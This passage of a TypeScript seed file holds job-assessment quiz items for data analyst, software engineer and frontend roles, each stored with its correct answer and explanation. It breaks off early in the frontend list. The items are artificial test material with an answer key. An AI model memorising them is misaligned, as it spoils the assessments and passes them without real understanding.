export interface SeedAssessmentQuestion {
  roleSlug: string;
  skillSlug: string;
  skillName: string;
  difficulty: 'easy' | 'applied' | 'scenario' | 'challenging';
  questionType: 'MCQ' | 'SCENARIO' | 'DEBUGGING' | 'OUTPUT_PREDICTION' | 'SQL_QUERY' | 'DATA_INTERPRETATION';
  question: string;
  scenario?: string;
  codeSnippet?: string;
  options: string[];
  correctAnswer: string;
  explanation: string;
  timeLimitSeconds: number;
  orderIndex: number;
}

// 25 Questions for Data Analyst
const DATA_ANALYST_QUESTIONS: SeedAssessmentQuestion[] = [
  // 1-8: Foundation / Easy
  {
    roleSlug: 'data-analyst',
    skillSlug: 'sql',
    skillName: 'SQL & Querying',
    difficulty: 'easy',
    questionType: 'MCQ',
    question: 'Which SQL clause is used to filter records resulting from an aggregate function like COUNT() or SUM()?',
    options: ['WHERE', 'HAVING', 'GROUP BY', 'FILTER'],
    correctAnswer: 'HAVING',
    explanation: 'The HAVING clause filters groups created by GROUP BY or aggregated expressions, whereas WHERE filters individual rows before aggregation.',
    timeLimitSeconds: 45,
    orderIndex: 1,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'data-cleaning',
    skillName: 'Data Cleaning & Preprocessing',
    difficulty: 'easy',
    questionType: 'MCQ',
    question: 'What is the primary difference between a NULL value and an empty string ("") in relational databases?',
    options: ['They are identical in all SQL engines', 'NULL represents missing/unknown data; empty string is a known string of length zero', 'NULL always equals 0; empty string equals 1', 'NULL can only exist in integer columns'],
    correctAnswer: 'NULL represents missing/unknown data; empty string is a known string of length zero',
    explanation: 'NULL denotes the absence of a value (unknown/unrecorded), while an empty string is a defined text entity with zero characters.',
    timeLimitSeconds: 45,
    orderIndex: 2,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'statistics',
    skillName: 'Statistical Analysis',
    difficulty: 'easy',
    questionType: 'MCQ',
    question: 'When analyzing heavily right-skewed salary data with extreme billionaire outliers, which measure of central tendency is most representative of the typical employee?',
    options: ['Mean (Average)', 'Median', 'Mode', 'Range'],
    correctAnswer: 'Median',
    explanation: 'The median is robust against extreme outliers and skewness, representing the 50th percentile of typical compensation.',
    timeLimitSeconds: 45,
    orderIndex: 3,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'python-pandas',
    skillName: 'Python & Pandas',
    difficulty: 'easy',
    questionType: 'OUTPUT_PREDICTION',
    question: 'What does `df.shape` return in Pandas for a DataFrame with 1,500 rows and 8 columns?',
    codeSnippet: 'import pandas as pd\ndf = pd.read_csv("sales.csv")\nprint(df.shape)',
    options: ['1500', '(1500, 8)', '8', '{"rows": 1500, "cols": 8}'],
    correctAnswer: '(1500, 8)',
    explanation: 'DataFrame.shape returns a Python tuple in the format (n_rows, n_columns).',
    timeLimitSeconds: 45,
    orderIndex: 4,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'data-viz',
    skillName: 'Data Visualization',
    difficulty: 'easy',
    questionType: 'MCQ',
    question: 'Which chart type is best suited to display the distribution of continuous customer purchase amounts across ranges?',
    options: ['Pie Chart', 'Histogram', 'Scatter Plot without trendline', 'Stacked Bar Chart'],
    correctAnswer: 'Histogram',
    explanation: 'Histograms bin continuous values into intervals to visualize distribution frequency and density.',
    timeLimitSeconds: 45,
    orderIndex: 5,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'sql',
    skillName: 'SQL & Querying',
    difficulty: 'easy',
    questionType: 'MCQ',
    question: 'What type of JOIN returns all records from the left table and matching records from the right table, filling with NULL where no match exists?',
    options: ['INNER JOIN', 'LEFT OUTER JOIN', 'FULL OUTER JOIN', 'CROSS JOIN'],
    correctAnswer: 'LEFT OUTER JOIN',
    explanation: 'A LEFT JOIN preserves every row from the left table regardless of whether the join predicate matches on the right.',
    timeLimitSeconds: 45,
    orderIndex: 6,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'business-analysis',
    skillName: 'Business Analytics',
    difficulty: 'easy',
    questionType: 'MCQ',
    question: 'What does Customer Acquisition Cost (CAC) represent?',
    options: ['Total revenue divided by total customers', 'Total marketing/sales spend divided by number of new customers acquired', 'Gross profit minus operational expenses', 'Monthly churn rate multiplied by average lifespan'],
    correctAnswer: 'Total marketing/sales spend divided by number of new customers acquired',
    explanation: 'CAC measures total sales and marketing expenditure required to convert one new paying customer.',
    timeLimitSeconds: 45,
    orderIndex: 7,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'data-cleaning',
    skillName: 'Data Cleaning & Preprocessing',
    difficulty: 'easy',
    questionType: 'MCQ',
    question: 'In Pandas, which method replaces all NaN values in a column with a specified default value?',
    options: ['df.drop_duplicates()', 'df.fillna(value)', 'df.dropna()', 'df.replace_null()'],
    correctAnswer: 'df.fillna(value)',
    explanation: 'DataFrame.fillna(value) fills NA/NaN values with the provided constant or interpolated value.',
    timeLimitSeconds: 45,
    orderIndex: 8,
  },

  // 9-17: Entry-Level Applied
  {
    roleSlug: 'data-analyst',
    skillSlug: 'sql',
    skillName: 'SQL & Querying',
    difficulty: 'applied',
    questionType: 'SQL_QUERY',
    question: 'A `customers` table has multiple rows with duplicate `email` addresses. Which query lists all emails that appear more than once?',
    options: [
      'SELECT email FROM customers WHERE COUNT(email) > 1;',
      'SELECT email, COUNT(*) FROM customers GROUP BY email HAVING COUNT(*) > 1;',
      'SELECT DISTINCT email FROM customers ORDER BY email DESC;',
      'SELECT email FROM customers WHERE email = email;'
    ],
    correctAnswer: 'SELECT email, COUNT(*) FROM customers GROUP BY email HAVING COUNT(*) > 1;',
    explanation: 'Grouping by email and filtering groups with HAVING COUNT(*) > 1 identifies duplicate keys accurately.',
    timeLimitSeconds: 60,
    orderIndex: 9,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'data-cleaning',
    skillName: 'Data Cleaning & Preprocessing',
    difficulty: 'applied',
    questionType: 'SCENARIO',
    scenario: 'You find that 8% of transactions in an e-commerce dataset have a missing `shipping_country` value.',
    question: 'What is the most sound first step before deciding whether to drop rows or impute values?',
    options: [
      'Immediately delete all rows with missing shipping_country',
      'Check if missingness correlates with a specific payment gateway, order type (e.g. digital downloads), or source system',
      'Fill all missing values with "United States" without checking',
      'Replace shipping_country with the numerical mean'
    ],
    correctAnswer: 'Check if missingness correlates with a specific payment gateway, order type (e.g. digital downloads), or source system',
    explanation: 'Investigating missingness mechanisms (e.g. digital products having no shipping address by design) prevents corrupting downstream analyses.',
    timeLimitSeconds: 75,
    orderIndex: 10,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'python-pandas',
    skillName: 'Python & Pandas',
    difficulty: 'applied',
    questionType: 'OUTPUT_PREDICTION',
    question: 'Given the following code, what is the output of `df.groupby("category")["revenue"].sum()["Electronics"]`?',
    codeSnippet: 'import pandas as pd\ndata = {"category": ["Electronics", "Apparel", "Electronics"], "revenue": [200, 150, 300]}\ndf = pd.DataFrame(data)\nprint(df.groupby("category")["revenue"].sum()["Electronics"])',
    options: ['200', '300', '500', '650'],
    correctAnswer: '500',
    explanation: 'The Electronics category aggregates revenues of 200 + 300 = 500.',
    timeLimitSeconds: 60,
    orderIndex: 11,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'statistics',
    skillName: 'Statistical Analysis',
    difficulty: 'applied',
    questionType: 'MCQ',
    question: 'In an A/B test with 10,000 visitors per variant, Variant B has a p-value of 0.01 compared to control Variant A (alpha = 0.05). How should you interpret this?',
    options: [
      'There is a 99% probability that Variant B is identical to Variant A',
      'Under the null hypothesis of no difference, observing this difference occurs with only a 1% chance; the result is statistically significant',
      'Variant B is guaranteed to increase revenue by exactly 1%',
      'The test is invalid because sample sizes must exceed 100,000'
    ],
    correctAnswer: 'Under the null hypothesis of no difference, observing this difference occurs with only a 1% chance; the result is statistically significant',
    explanation: 'A p-value < 0.05 provides evidence against the null hypothesis, indicating the observed lift is unlikely due to random chance.',
    timeLimitSeconds: 75,
    orderIndex: 12,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'data-viz',
    skillName: 'Data Visualization',
    difficulty: 'applied',
    questionType: 'MCQ',
    question: 'Which visualization is most effective for demonstrating the correlation between advertising spend and sales revenue across 50 regional markets?',
    options: ['Stacked Bar Chart', 'Scatter Plot with Trend Line', 'Donut Chart', 'Treemap'],
    correctAnswer: 'Scatter Plot with Trend Line',
    explanation: 'Scatter plots visualize the relationship, density, and linear/non-linear correlation between two continuous variables.',
    timeLimitSeconds: 60,
    orderIndex: 13,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'sql',
    skillName: 'SQL & Querying',
    difficulty: 'applied',
    questionType: 'DEBUGGING',
    scenario: 'A junior analyst writes: `SELECT department_id, AVG(salary) FROM employees WHERE AVG(salary) > 50000 GROUP BY department_id;`',
    question: 'Why does this query fail in PostgreSQL/MySQL?',
    options: [
      'Aggregate functions like AVG() cannot appear in the WHERE clause; use HAVING instead',
      'department_id must be enclosed in single quotes',
      'GROUP BY must come before WHERE',
      'AVG(salary) requires the keyword SUM'
    ],
    correctAnswer: 'Aggregate functions like AVG() cannot appear in the WHERE clause; use HAVING instead',
    explanation: 'The WHERE clause operates on rows prior to aggregation; filtering aggregate values requires HAVING AVG(salary) > 50000.',
    timeLimitSeconds: 60,
    orderIndex: 14,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'business-analysis',
    skillName: 'Business Analytics',
    difficulty: 'applied',
    questionType: 'SCENARIO',
    scenario: 'A subscription SaaS product has 1,000 customers on Jan 1. During January, 50 cancel, and 100 new customers sign up.',
    question: 'What is the customer churn rate for January?',
    options: ['5% (50/1000)', '10% (100/1000)', '4.76% (50/1050)', '50% (50/100)'],
    correctAnswer: '5% (50/1000)',
    explanation: 'Customer Churn Rate = Churned Customers in period / Starting Customers = 50 / 1000 = 5.0%.',
    timeLimitSeconds: 60,
    orderIndex: 15,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'data-cleaning',
    skillName: 'Data Cleaning & Preprocessing',
    difficulty: 'applied',
    questionType: 'MCQ',
    question: 'When handling dates stored as text strings like "2026-08-20" and "08/20/2026" in mixed formats, what is the best practice before performing monthly aggregations?',
    options: [
      'Sort strings alphabetically',
      'Parse both into ISO-8601 standardized datetime objects (YYYY-MM-DD)',
      'Extract the first two characters to identify the month',
      'Store as floating point integers'
    ],
    correctAnswer: 'Parse both into ISO-8601 standardized datetime objects (YYYY-MM-DD)',
    explanation: 'Standardizing dates to true datetime types avoids lexicographical sorting bugs and ensures valid time-series grouping.',
    timeLimitSeconds: 60,
    orderIndex: 16,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'python-pandas',
    skillName: 'Python & Pandas',
    difficulty: 'applied',
    questionType: 'OUTPUT_PREDICTION',
    question: 'What does `df["price"].apply(lambda x: x * 1.10)` do?',
    options: [
      'Returns a Series with price increased by 10%',
      'Permanently deletes the price column',
      'Filters rows where price is greater than 1.10',
      'Calculates the average price'
    ],
    correctAnswer: 'Returns a Series with price increased by 10%',
    explanation: 'Series.apply() maps the lambda function over each element, multiplying values by 1.10.',
    timeLimitSeconds: 60,
    orderIndex: 17,
  },

  // 18-22: Practical Scenario / Decision Making
  {
    roleSlug: 'data-analyst',
    skillSlug: 'business-analysis',
    skillName: 'Business Analytics',
    difficulty: 'scenario',
    questionType: 'SCENARIO',
    scenario: 'Executive leadership notes that total revenue dropped 15% in February compared to January.',
    question: 'Which of the following should you investigate first before reporting a fundamental sales decline?',
    options: [
      'Immediately conclude marketing campaigns failed',
      'Normalize for the number of calendar days (28 vs 31 days) and inspect daily run-rates',
      'Delete the lowest revenue day from February',
      'Change the chart scale to hide the dip'
    ],
    correctAnswer: 'Normalize for the number of calendar days (28 vs 31 days) and inspect daily run-rates',
    explanation: 'February has ~9.7% fewer days than January; checking average daily revenue is essential before attributing differences to business performance.',
    timeLimitSeconds: 90,
    orderIndex: 18,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'sql',
    skillName: 'SQL & Querying',
    difficulty: 'scenario',
    questionType: 'SQL_QUERY',
    scenario: 'You need to assign a rank to employees based on their salary within their department without skipping rank numbers when ties occur.',
    question: 'Which SQL Window function should you use?',
    options: ['ROW_NUMBER()', 'RANK()', 'DENSE_RANK()', 'LEAD()'],
    correctAnswer: 'DENSE_RANK()',
    explanation: 'DENSE_RANK() assigns consecutive rank values (1, 2, 2, 3) without gaps when duplicate values occur in the partition.',
    timeLimitSeconds: 90,
    orderIndex: 19,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'statistics',
    skillName: 'Statistical Analysis',
    difficulty: 'scenario',
    questionType: 'SCENARIO',
    scenario: 'You observe a strong positive correlation (r = 0.88) between ice cream sales and sunscreen sales in a coastal town.',
    question: 'What is the correct analytical deduction?',
    options: [
      'Eating ice cream causes people to buy sunscreen',
      'Buying sunscreen causes people to crave ice cream',
      'A confounding variable (hot summer temperature) drives both; correlation does not imply causation',
      'The correlation is a mathematical error because r cannot exceed 0.5'
    ],
    correctAnswer: 'A confounding variable (hot summer temperature) drives both; correlation does not imply causation',
    explanation: 'Spurious or common-cause correlation occurs when a third variable (temperature) influences both measurements simultaneously.',
    timeLimitSeconds: 90,
    orderIndex: 20,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'data-viz',
    skillName: 'Data Visualization',
    difficulty: 'scenario',
    questionType: 'SCENARIO',
    scenario: 'A dashboard shows a 3D pie chart with 14 slices and explosive exploded segments.',
    question: 'Why is this considered poor data visualization practice?',
    options: [
      '3D angles distort proportional perception and comparing 14 color slices strains human working memory',
      'Pie charts cannot be rendered in web browsers',
      '3D pie charts consume too much database bandwidth',
      'Percentages cannot be calculated for more than 5 categories'
    ],
    correctAnswer: '3D angles distort proportional perception and comparing 14 color slices strains human working memory',
    explanation: '3D perspectives distort slice areas and pie charts with >5 categories are difficult to decode; a horizontal bar chart is superior.',
    timeLimitSeconds: 90,
    orderIndex: 21,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'data-cleaning',
    skillName: 'Data Cleaning & Preprocessing',
    difficulty: 'scenario',
    questionType: 'SCENARIO',
    scenario: 'In an age column with values between 18 and 65, you spot values like 999, -1, and 0.',
    question: 'What do these values most likely represent and how should they be treated?',
    options: [
      'They are legitimate ages of infants and supercentenarians; keep them unchanged',
      'They are legacy sentinel/placeholder values for missing data; convert them to NULL/NaN before statistical calculations',
      'Multiply negative values by -1 and average with 999',
      'Truncate the table'
    ],
    correctAnswer: 'They are legacy sentinel/placeholder values for missing data; convert them to NULL/NaN before statistical calculations',
    explanation: 'Legacy mainframe systems frequently used 999 or -1 as missing value markers; treating them as numbers heavily biases means.',
    timeLimitSeconds: 90,
    orderIndex: 22,
  },

  // 23-25: Entry-Level Challenging
  {
    roleSlug: 'data-analyst',
    skillSlug: 'sql',
    skillName: 'SQL & Querying',
    difficulty: 'challenging',
    questionType: 'SQL_QUERY',
    scenario: 'Given an `orders` table (customer_id, order_date, order_id), you need to find customers who placed orders in both 2025 AND 2026.',
    question: 'Which query correctly and efficiently identifies these customers?',
    options: [
      'SELECT customer_id FROM orders WHERE EXTRACT(YEAR FROM order_date) IN (2025, 2026);',
      'SELECT customer_id FROM orders WHERE EXTRACT(YEAR FROM order_date) IN (2025, 2026) GROUP BY customer_id HAVING COUNT(DISTINCT EXTRACT(YEAR FROM order_date)) = 2;',
      'SELECT customer_id FROM orders WHERE order_date = 2025 AND order_date = 2026;',
      'SELECT customer_id FROM orders GROUP BY customer_id HAVING SUM(order_id) > 2025;'
    ],
    correctAnswer: 'SELECT customer_id FROM orders WHERE EXTRACT(YEAR FROM order_date) IN (2025, 2026) GROUP BY customer_id HAVING COUNT(DISTINCT EXTRACT(YEAR FROM order_date)) = 2;',
    explanation: 'Grouping by customer_id and asserting COUNT(DISTINCT YEAR) = 2 ensures presence in both distinct calendar years.',
    timeLimitSeconds: 100,
    orderIndex: 23,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'python-pandas',
    skillName: 'Python & Pandas',
    difficulty: 'challenging',
    questionType: 'OUTPUT_PREDICTION',
    scenario: 'You merge two DataFrames: `orders` (1,000 rows) and `discounts` (50 rows) using `how="left"` on `discount_code`. However, the resulting DataFrame has 1,200 rows.',
    question: 'What is the root cause of the row count inflation?',
    options: [
      'A bug in Pandas merge function',
      'The discounts DataFrame contains duplicate entries for some discount_code keys, causing a 1-to-many Cartesian multiplication',
      'Left join always increases row counts by the size of the right table',
      'Missing discount codes create duplicate rows automatically'
    ],
    correctAnswer: 'The discounts DataFrame contains duplicate entries for some discount_code keys, causing a 1-to-many Cartesian multiplication',
    explanation: 'When join keys in the right table are not unique, each matching row is duplicated for every key instance in the right table.',
    timeLimitSeconds: 100,
    orderIndex: 24,
  },
  {
    roleSlug: 'data-analyst',
    skillSlug: 'business-analysis',
    skillName: 'Business Analytics',
    difficulty: 'challenging',
    questionType: 'SCENARIO',
    scenario: 'A cohort retention analysis shows Month 1 retention is 40%, Month 2 is 35%, Month 3 is 34%, and Month 6 is 34%.',
    question: 'What is the key business takeaway regarding Product-Market Fit from this curve?',
    options: [
      'The product is failing because 66% of users left',
      'The retention curve has flattened/stabilized around 34%, indicating a loyal core audience with viable long-term retention',
      'Month 6 revenue will inevitably drop to 0%',
      'The analysis is inconclusive without calculating standard deviation'
    ],
    correctAnswer: 'The retention curve has flattened/stabilized around 34%, indicating a loyal core audience with viable long-term retention',
    explanation: 'A flattened retention curve is the classic indicator of product-market fit: after initial drop-off, a persistent cohort continues using the product.',
    timeLimitSeconds: 100,
    orderIndex: 25,
  }
];

// Helper to generate 25 questions for Software Engineer
function getSweQuestions(): SeedAssessmentQuestion[] {
  const list: SeedAssessmentQuestion[] = [];
  const topics = [
    { skill: 'programming', name: 'Programming & Logic', diff: 'easy', q: 'What is the time complexity of looking up a key in a balanced Hash Map under average conditions?', opts: ['O(1)', 'O(n)', 'O(log n)', 'O(n^2)'], ans: 'O(1)', exp: 'Hash maps provide amortized O(1) constant time average lookup.' },
    { skill: 'git', name: 'Git & Version Control', diff: 'easy', q: 'Which Git command creates and switches to a new branch named "feature-auth"?', opts: ['git branch feature-auth', 'git checkout -b feature-auth', 'git switch --main feature-auth', 'git merge feature-auth'], ans: 'git checkout -b feature-auth', exp: 'git checkout -b creates and checks out the new branch in one step.' },
    { skill: 'debugging', name: 'Debugging & Code Reading', diff: 'easy', q: 'In JavaScript/TypeScript, what is the output of `typeof null`?', opts: ['"null"', '"undefined"', '"object"', '"boolean"'], ans: '"object"', exp: 'In JS, typeof null returns "object" due to legacy type tag representation.' },
    { skill: 'testing', name: 'Deterministic Testing', diff: 'easy', q: 'What is the primary characteristic of a pure function in unit testing?', opts: ['It mutates global variables', 'Given identical inputs, it always returns the identical output with zero side effects', 'It must execute asynchronously', 'It writes directly to disk'], ans: 'Given identical inputs, it always returns the identical output with zero side effects', exp: 'Pure functions have no side effects and produce deterministic outputs.' },
    { skill: 'rest-apis', name: 'REST APIs & Endpoints', diff: 'easy', q: 'Which HTTP status code should be returned when a requested resource is not found?', opts: ['200 OK', '404 Not Found', '500 Internal Server Error', '401 Unauthorized'], ans: '404 Not Found', exp: 'HTTP 404 indicates the server cannot find the requested URI.' },
    { skill: 'data-structures', name: 'Data Structures', diff: 'easy', q: 'Which data structure follows a First-In-First-Out (FIFO) access order?', opts: ['Stack', 'Queue', 'Binary Tree', 'Heap'], ans: 'Queue', exp: 'Queues process elements in FIFO order.' },
    { skill: 'databases', name: 'Databases & SQL', diff: 'easy', q: 'What does ACID stand for in relational database transactions?', opts: ['Atomicity, Consistency, Isolation, Durability', 'Array, Cache, Index, Document', 'Asynchronous, Concurrent, Integrated, Distributed', 'Access, Control, Interface, Data'], ans: 'Atomicity, Consistency, Isolation, Durability', exp: 'ACID guarantees transaction validity and resilience against failures.' },
    { skill: 'oop', name: 'Object-Oriented Programming', diff: 'easy', q: 'What OOP principle allows derived classes to override methods of a parent class?', opts: ['Encapsulation', 'Polymorphism', 'Composition', 'Abstraction'], ans: 'Polymorphism', exp: 'Polymorphism enables objects of different types to respond to method calls appropriately.' },
    
    // Applied 9-17
    { skill: 'programming', name: 'Programming & Logic', diff: 'applied', q: 'What is the output of `[1, 2, 3].map(x => x * 2).filter(x => x > 3)`?', opts: ['[2, 4, 6]', '[4, 6]', '[6]', '[2]'], ans: '[4, 6]', exp: 'Mapping doubles elements to [2, 4, 6]; filtering for >3 leaves [4, 6].' },
    { skill: 'debugging', name: 'Debugging & Code Reading', diff: 'applied', q: 'A loop runs `for (var i = 0; i < 3; i++) { setTimeout(() => console.log(i), 100); }`. What is logged?', opts: ['0, 1, 2', '3, 3, 3', 'undefined, undefined, undefined', '0, 0, 0'], ans: '3, 3, 3', exp: 'var is function-scoped; when callbacks fire after the timer, i is 3.' },
    { skill: 'rest-apis', name: 'REST APIs & Endpoints', diff: 'applied', q: 'Which HTTP method should be used to partially update an existing resource?', opts: ['GET', 'POST', 'PATCH', 'DELETE'], ans: 'PATCH', exp: 'PATCH applies partial modifications to a resource, while PUT replaces the entire resource.' },
    { skill: 'git', name: 'Git & Version Control', diff: 'applied', q: 'You want to discard uncommitted changes in your working directory for a single file `src/app.ts`. What command does this safely?', opts: ['git checkout -- src/app.ts (or git restore src/app.ts)', 'git rm src/app.ts', 'git commit -m "delete"', 'git push origin main'], ans: 'git checkout -- src/app.ts (or git restore src/app.ts)', exp: 'git restore (or checkout --) resets uncommitted working tree modifications.' },
    { skill: 'testing', name: 'Deterministic Testing', diff: 'applied', q: 'Why is mocking third-party payment gateway APIs important in automated CI unit tests?', opts: ['To make tests execute faster, deterministically, and avoid real financial transactions', 'To test bank network hardware', 'Mocking is bad practice and should never be used', 'To bypass compiler type checking'], ans: 'To make tests execute faster, deterministically, and avoid real financial transactions', exp: 'Mocks isolate the system under test and guarantee repeatable test suites.' },
    { skill: 'data-structures', name: 'Data Structures', diff: 'applied', q: 'What is the worst-case time complexity of inserting n items into an unbalanced Binary Search Tree?', opts: ['O(1)', 'O(log n)', 'O(n^2)', 'O(n)'], ans: 'O(n^2)', exp: 'Inserting into an already sorted list creates a skewed linked list of depth n, yielding O(n^2) total time.' },
    { skill: 'databases', name: 'Databases & SQL', diff: 'applied', q: 'What is the purpose of creating a foreign key constraint between two database tables?', opts: ['To encrypt passwords', 'To enforce referential integrity and prevent orphan records', 'To speed up text searches', 'To limit tables to 100 rows'], ans: 'To enforce referential integrity and prevent orphan records', exp: 'Foreign keys guarantee valid references between related tables.' },
    { skill: 'programming', name: 'Programming & Logic', diff: 'applied', q: 'In TypeScript, what does `type Result<T> = { data: T } | { error: Error }` represent?', opts: ['A Discriminated Union type handling success or failure', 'A circular class reference', 'A tuple with two strings', 'A runtime database connection'], ans: 'A Discriminated Union type handling success or failure', exp: 'Union types allow robust error handling without unhandled exceptions.' },
    { skill: 'debugging', name: 'Debugging & Code Reading', diff: 'applied', q: 'A function throws `TypeError: Cannot read properties of undefined (reading "id")`. What is the best defensive fix in modern JavaScript?', opts: ['Use optional chaining `user?.id` or default parameter check', 'Delete the id variable', 'Wrap entire codebase in eval()', 'Convert object to a string'], ans: 'Use optional chaining `user?.id` or default parameter check', exp: 'Optional chaining safely short-circuits to undefined if user is nullish.' },

    // Scenario 18-22
    { skill: 'rest-apis', name: 'REST APIs & Endpoints', diff: 'scenario', q: 'A client submits an invalid request payload with missing required fields. What HTTP status should your API return?', opts: ['200 OK', '400 Bad Request (or 422 Unprocessable Entity)', '500 Server Error', '302 Found'], ans: '400 Bad Request (or 422 Unprocessable Entity)', exp: 'Client-side payload validation failures belong in the 4xx client error status code family.' },
    { skill: 'databases', name: 'Databases & SQL', diff: 'scenario', q: 'Two concurrent transactions update the same account balance simultaneously. What database mechanism prevents lost updates?', opts: ['Row-level locking or optimistic concurrency control (versioning)', 'Disabling primary keys', 'Running vacuum every second', 'Converting table to JSON file'], ans: 'Row-level locking or optimistic concurrency control (versioning)', exp: 'Transaction isolation locks or version checks prevent concurrent overwrite race conditions.' },
    { skill: 'testing', name: 'Deterministic Testing', diff: 'scenario', q: 'A test passes locally but intermittently fails in CI on Mondays. What is the most likely root cause?', opts: ['Flaky dependency on system timezone / Date.now() without mocking clocks', 'Git corrupted the file', 'TypeScript compiler bug', 'Linux file permissions'], ans: 'Flaky dependency on system timezone / Date.now() without mocking clocks', exp: 'Time-dependent tests fail across timezones or week boundaries unless mocked.' },
    { skill: 'programming', name: 'Programming & Logic', diff: 'scenario', q: 'You need to deduplicate an array of 50,000 integers in JavaScript. What is the most efficient idiom?', opts: ['Array.from(new Set(arr))', 'Nested loop with array.splice()', 'Recursive factorial', 'Writing array to localStorage'], ans: 'Array.from(new Set(arr))', exp: 'Set uses O(1) hash lookups, deduplicating in O(n) linear time.' },
    { skill: 'git', name: 'Git & Version Control', diff: 'scenario', q: 'While merging `main` into your branch, Git reports a merge conflict in `config.ts`. What is the correct workflow?', opts: ['Delete .git folder', 'Inspect conflict markers (<<<<<<<, =======, >>>>>>>), resolve differences, stage file, and commit merge', 'Force push with -f', 'Rename config.ts to config2.ts'], ans: 'Inspect conflict markers (<<<<<<<, =======, >>>>>>>), resolve differences, stage file, and commit merge', exp: 'Resolving conflicts requires harmonizing conflicting lines and finalizing the commit.' },

    // Challenging 23-25
    { skill: 'programming', name: 'Programming & Logic', diff: 'challenging', q: 'What is the danger of executing un-sanitized user input inside SQL queries ("SELECT * FROM users WHERE name = " + input)?', opts: ['Memory leak', 'SQL Injection vulnerability where attackers can alter queries or extract entire database', 'Compiler syntax error', 'Slow network throughput'], ans: 'SQL Injection vulnerability where attackers can alter queries or extract entire database', exp: 'String concatenation in SQL queries invites SQL Injection; always use parameterized queries.' },
    { skill: 'data-structures', name: 'Data Structures', diff: 'challenging', q: 'You need to maintain the top 10 highest stock prices in a continuous real-time data stream of millions of events. What data structure is most optimal?', opts: ['Min-Heap of fixed size 10', 'Unsorted linked list', 'Array sorted on every insert via bubble sort', 'Binary Search Tree with all millions of nodes'], ans: 'Min-Heap of fixed size 10', exp: 'A min-heap of size k allows O(log k) updates with O(1) space overhead.' },
    { skill: 'rest-apis', name: 'REST APIs & Endpoints', diff: 'challenging', q: 'How should an API handle clients submitting duplicate requests due to network timeouts on payment transactions?', opts: ['Process every request independently', 'Implement Idempotency Keys (e.g. Idempotency-Key header) to deduplicate repeated requests', 'Block client IP address', 'Always return 500 error'], ans: 'Implement Idempotency Keys (e.g. Idempotency-Key header) to deduplicate repeated requests', exp: 'Idempotency keys ensure identical operations execute at most once even when retried.' },
  ];

  topics.forEach((t, i) => {
    list.push({
      roleSlug: 'software-engineer',
      skillSlug: t.skill,
      skillName: t.name,
      difficulty: t.diff as any,
      questionType: 'MCQ',
      question: t.q,
      options: t.opts,
      correctAnswer: t.ans,
      explanation: t.exp,
      timeLimitSeconds: t.diff === 'easy' ? 45 : t.diff === 'applied' ? 60 : 90,
      orderIndex: i + 1,
    });
  });

  return list;
}


// 25 Questions for Frontend Developer
function getFrontendQuestions(): SeedAssessmentQuestion[] {
  const topics = [
    { skill: 'html-css', name: 'HTML & CSS Foundations', diff: 'easy', q: 'Which CSS property creates a two-dimensional grid layout container?', opts: ['display: flex', 'display: grid', 'display: block', 'display: inline'], ans: 'display: grid', exp: 'display: grid establishes a grid formatting context for row and column alignment.' },
    { skill: 'javascript', name: 'JavaScript Core', diff: 'easy', q: 'What is the purpose of `Array.prototype.map()` in JavaScript?', opts: ['Mutates the original array by deleting items', 'Creates a new array populated with the results of calling a provided function on every element', 'Calculates the sum of all elements', 'Sorts elements alphabetically'], ans: 'Creates a new array populated with the results of calling a provided function on every element', exp: 'map() is a non-mutating higher-order function that produces a transformed array of equal length.' },
    { skill: 'react', name: 'React Foundations', diff: 'easy', q: 'Which React hook should be used to run side-effects like data fetching or event subscriptions?', opts: ['useState', 'useEffect', 'useMemo', 'useContext'], ans: 'useEffect', exp: 'useEffect manages component lifecycle side-effects and synchronization.' },
    { skill: 'dom', name: 'DOM & Browser APIs', diff: 'easy', q: 'What method cancels the default browser action of an event (e.g. form submission reloading the page)?', opts: ['event.stopPropagation()', 'event.preventDefault()', 'event.stopImmediatePropagation()', 'event.cancel()'], ans: 'event.preventDefault()', exp: 'event.preventDefault() suppresses the default browser user-agent behavior.' },
    { skill: 'a11y', name: 'Web Accessibility (a11y)', diff: 'easy', q: 'What attribute provides alternative text for images to assist screen reader users?', opts: ['title', 'alt', 'aria-label-only', 'src'], ans: 'alt', exp: 'The alt attribute on <img> elements communicates graphic context to assistive technology.' },
    { skill: 'http-apis', name: 'HTTP & APIs', diff: 'easy', q: 'What is the standard format used to serialize structured data between client and web APIs?', opts: ['XML only', 'JSON (JavaScript Object Notation)', 'Binary PCAP', 'CSV text'], ans: 'JSON (JavaScript Object Notation)', exp: 'JSON is the universal lightweight data interchange format in modern web applications.' },
    { skill: 'responsive-design', name: 'Responsive Layouts', diff: 'easy', q: 'Which CSS unit scales relative to the root font-size of the document?', opts: ['em', 'rem', 'px', 'vh'], ans: 'rem', exp: 'rem (root em) computes dimensions relative to the font-size of the <html> element.' },
    { skill: 'state-management', name: 'State Management', diff: 'easy', q: 'What happens when state in a React component is updated via `setState`?', opts: ['The entire browser page reloads', 'The component schedules a re-render to update the virtual DOM', 'Database records are deleted', 'CSS styles are removed'], ans: 'The component schedules a re-render to update the virtual DOM', exp: 'React re-executes the component function and reconciles DOM mutations.' },

    // Applied 9-17
    { skill: 'react', name: 'React Foundations', diff: 'applied', q: 'Why is it dangerous to modify React state directly like `state.count = 5` instead of `setCount(5)`?', opts: ['React will not detect the mutation and will not trigger a re-render', 'JavaScript throws a syntax error', 'It destroys the browser cache', 'It converts numbers to strings'], ans: 'React will not detect the mutation and will not trigger a re-render', exp: 'Direct mutations bypass React reactivity tracking and state reconciliation.' },
